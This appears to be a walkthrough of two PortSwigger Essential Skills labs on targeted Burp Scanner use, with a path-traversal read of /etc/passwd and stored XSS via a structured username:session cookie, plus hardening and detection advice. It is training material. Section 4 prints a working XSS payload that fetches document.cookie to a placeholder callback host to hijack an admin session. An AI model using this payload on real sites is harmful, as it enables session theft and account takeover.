# PortSwigger Essential Skills 1-2 — Targeted Scanning Is a Manual Testing Tool

This is a consolidated walkthrough of the two PortSwigger Essential Skills labs about using Burp Scanner during manual testing.

Both labs were completed in the authorized Web Security Academy environment. The main lesson is that scanner value comes from precise human-selected insertion points, not from blind full-site scanning.

## 1. Overview

| # | Lab | Training point | Core idea |
|---|-----|----------------|-----------|
| 1 | Discovering vulnerabilities quickly with targeted scanning | fast file-read discovery | identify a likely file-fetch request, scan that request, then manually retrieve `/etc/passwd` |
| 2 | Scanning non-standard data structures | custom insertion points | select the username segment inside a structured cookie and scan only that sub-value |

## 2. Triage model

Use Scanner as a focused assistant:

1. Map the application manually.
2. Identify a high-risk boundary: file path, URL fetcher, cookie sub-field, nested JSON field, encoded blob, or template input.
3. Run a targeted scan on that request or selected insertion point.
4. Interpret the finding as a vulnerability primitive.
5. Complete the lab manually with a minimal request.

This keeps scanner output tied to a model of the application instead of turning it into background noise.

## 3. Targeted scanning for file read

The first lab requires `/etc/passwd` within a tight time limit. PortSwigger intentionally does not publish a step-by-step solution because the point is the workflow.

The effective path is:

- inspect normal traffic;
- prioritize requests that appear to fetch server-side resources, such as images or downloads;
- run a targeted scan against the suspicious request;
- use the reported arbitrary file-read vector in Repeater;
- reduce it to a request that returns `/etc/passwd`.

The vulnerability is not solved by scanning alone. The scanner identifies the attack vector quickly; manual testing turns it into the exact proof required by the lab.

## 4. Non-standard data structures

The second lab uses an authenticated cookie with a visible structure:

```text
username:session-id
```

The colon suggests that the server parses the cookie as two inputs. Select only the `username` portion as a custom insertion point and run a targeted scan. Burp Scanner reports stored XSS after observing an out-of-band interaction.

To confirm impact, preserve the session-id portion and replace only the username portion with a browser-side callback payload:

```text
'"><svg/onload=fetch(`//YOUR-COLLABORATOR-PAYLOAD/${encodeURIComponent(document.cookie)}`)>:YOUR-SESSION-ID
```

The preserved session-id keeps the request authenticated. The stored payload executes when the privileged user views the affected content, allowing the administrator session to be used to delete `carlos`.

This lab's official path uses Burp Collaborator as part of the scanner demonstration. In this series it is documented as completed training content, not as an unresolved dependency.

## 5. Defense and detection

Hardening:

- use server-side resource IDs instead of user-controlled file paths;
- canonicalize paths before validating containment;
- keep session cookies opaque and random;
- if structured cookies are unavoidable, sign and validate each field;
- encode stored data for the exact output context;
- require manual root-cause analysis after scanner findings.

Detection:

- traversal strings or absolute paths in file/resource parameters;
- HTML tags, event handlers, and quote-breaking payloads inside cookie sub-fields;
- large payload variation against one selected insertion point;
- privileged browser sessions causing outbound DNS or HTTP requests after rendering user-controlled content.

If a future lab truly requires Collaborator/OAST with no same-site or exploit-server alternative, it should be recorded as pending user-assisted verification while the rest of the series continues.
